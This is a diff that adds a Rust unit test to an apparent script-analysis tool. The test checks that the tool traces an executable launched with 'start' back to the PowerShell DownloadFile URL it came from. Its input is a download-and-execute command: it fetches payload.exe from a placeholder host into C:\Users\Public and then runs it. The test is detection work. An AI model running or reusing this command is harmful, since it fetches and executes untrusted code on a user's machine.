@@ -3424,6 +3424,27 @@ start "" "C:\Users\Public\payload.exe""#,
     }
 
     #[test]
+    fn start_local_target_resolves_second_powershell_downloadfile_destination_source_url() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object Net.WebClient).DownloadFile('https://start-ps-dlfile.example/payload.exe','C:\Users\Public\first.exe');(New-Object Net.WebClient).DownloadFile('https://start-ps-dlfile.example/payload.exe','C:\Users\Public\second.exe')"
+start "" "C:\Users\Public\second.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\second.exe""#
+                            && url == "https://start-ps-dlfile.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve second PowerShell DownloadFile destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
